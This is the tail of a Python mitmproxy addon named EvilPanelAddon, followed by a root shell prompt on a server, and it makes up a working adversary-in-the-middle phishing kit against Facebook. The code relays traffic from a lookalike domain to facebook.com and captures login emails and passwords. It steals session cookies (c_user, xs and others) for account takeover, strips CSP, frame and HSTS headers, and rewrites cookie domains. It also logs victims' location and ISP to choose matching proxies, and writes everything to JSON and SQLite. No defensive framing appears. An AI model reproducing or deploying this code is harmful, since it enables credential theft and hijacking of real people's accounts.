                ctx.log.info(f"[GEO] Target: {target_ip}")
                ctx.log.info(f"[GEO] Location: {geo['country'].upper()}/{geo['state']}/{geo['city']}/{geo['zip']}")
                ctx.log.info(f"[GEO] ISP: {geo['isp']} | ASN: {geo['asn']} | Mobile: {geo['mobile']}")
                
                # Get proxy levels
                levels = build_proxy_levels(geo)
                proxy_url, proxy_level = levels[0]  # Most specific
                
                ctx.log.info(f"[PROXY] Level: {proxy_level}")
                ctx.log.info(f"[PROXY] {proxy_url[:70]}...")
                ctx.log.info(f"[PROXY] Fallbacks: {len(levels)-1} available")
        
        flow.metadata["target_ip"] = target_ip
        flow.metadata["geo"] = geo
        flow.metadata["proxy_url"] = proxy_url
        flow.metadata["proxy_level"] = proxy_level
        flow.metadata["proxy_levels"] = build_proxy_levels(geo) if geo else []
        
        if flow.request.method == "POST":
            self._capture_creds(flow)
        
        # Rewrite host
        host = flow.request.host
        if host.endswith(self.domain):
            flow.request.host = host.replace(self.domain, "facebook.com")
            flow.request.headers["Host"] = flow.request.host

    def _capture_creds(self, flow):
        try:
            form = dict(flow.request.urlencoded_form)
            email = form.get("email") or form.get("username") or ""
            password = form.get("pass") or form.get("password") or ""
            
            if email and password:
                ip = flow.metadata.get("target_ip", "")
                geo = flow.metadata.get("geo")
                proxy = flow.metadata.get("proxy_url", "")
                level = flow.metadata.get("proxy_level", "")
                
                ctx.log.info(f"[CRED] ✅ CAPTURED: {email}")
                ctx.log.info(f"[CRED] From: {ip} | Proxy Level: {level}")
                
                # Save to JSON
                record = {
                    "timestamp": datetime.utcnow().isoformat(),
                    "email": email, "password": password,
                    "ip": ip, "geo": geo,
                    "proxy_url": proxy, "proxy_level": level,
                    "all_proxy_levels": [(p, l) for p, l in flow.metadata.get("proxy_levels", [])]
                }
                with open(os.path.join(DATA_DIR, "credentials.json"), "a") as f:
                    f.write(json.dumps(record) + "\n")
                
                # Save to DB
                conn = sqlite3.connect(DB_PATH)
                conn.execute(
                    "INSERT INTO credentials (email,password,ip_address,user_agent,geo_json,proxy_url,proxy_level) VALUES (?,?,?,?,?,?,?)",
                    (email, password, ip, flow.request.headers.get("User-Agent",""),
                     json.dumps(geo) if geo else "", proxy, level)
                )
                conn.commit()
                conn.close()
        except Exception as e:
            ctx.log.error(f"[CRED] Error: {e}")

    def response(self, flow: http.HTTPFlow):
        # Strip security headers
        for h in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"]:
            if h in flow.response.headers:
                del flow.response.headers[h]
        
        self._capture_tokens(flow)
        self._rewrite_cookies(flow)

    def _capture_tokens(self, flow):
        critical = ["c_user", "xs"]
        all_tokens = ["c_user", "xs", "fr", "datr", "sb", "wd"]
        captured = {}
        
        for cookie in flow.response.cookies:
            name = cookie[0]
            value = cookie[1][0] if cookie[1] else ""
            if name in all_tokens and value:
                captured[name] = value
        
        if all(k in captured for k in critical):
            ip = flow.metadata.get("target_ip", "")
            geo = flow.metadata.get("geo")
            proxy = flow.metadata.get("proxy_url", "")
            level = flow.metadata.get("proxy_level", "")
            
            ctx.log.info(f"[SESSION] ✅✅✅ CAPTURED!")
            ctx.log.info(f"[SESSION] c_user: {captured['c_user']}")
            ctx.log.info(f"[SESSION] xs: {captured['xs'][:25]}...")
            ctx.log.info(f"[SESSION] Proxy Level: {level}")
            ctx.log.info(f"[SESSION] Proxy URL: {proxy[:60]}...")
            
            # Save to JSON
            record = {
                "timestamp": datetime.utcnow().isoformat(),
                "tokens": captured, "ip": ip, "geo": geo,
                "proxy_url": proxy, "proxy_level": level,
                "all_proxy_levels": [(p, l) for p, l in flow.metadata.get("proxy_levels", [])]
            }
            with open(os.path.join(DATA_DIR, "sessions.json"), "a") as f:
                f.write(json.dumps(record) + "\n")
            
            # Save to DB
            try:
                conn = sqlite3.connect(DB_PATH)
                conn.execute(
                    """INSERT INTO sessions (c_user,xs,fr,datr,sb,wd,ip_address,geo_json,proxy_url,proxy_level) 
                       VALUES (?,?,?,?,?,?,?,?,?,?)""",
                    (captured.get("c_user",""), captured.get("xs",""), captured.get("fr",""),
                     captured.get("datr",""), captured.get("sb",""), captured.get("wd",""),
                     ip, json.dumps(geo) if geo else "", proxy, level)
                )
                conn.commit()
                conn.close()
            except Exception as e:
                ctx.log.error(f"[SESSION] DB Error: {e}")

    def _rewrite_cookies(self, flow):
        cookies = flow.response.headers.get_all("Set-Cookie")
        if not cookies:
            return
        del flow.response.headers["Set-Cookie"]
        for c in cookies:
            new_c = c.replace("domain=.facebook.com", f"domain=.{self.domain}")
            flow.response.headers.add("Set-Cookie", new_c)


addons = [EvilPanelAddon()]
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:/opt/evilpanel/data# ^C
root@ubuntu-s-2vcpu-4gb-120gb-intel-sgp1-01:/opt/evilpanel/data# 

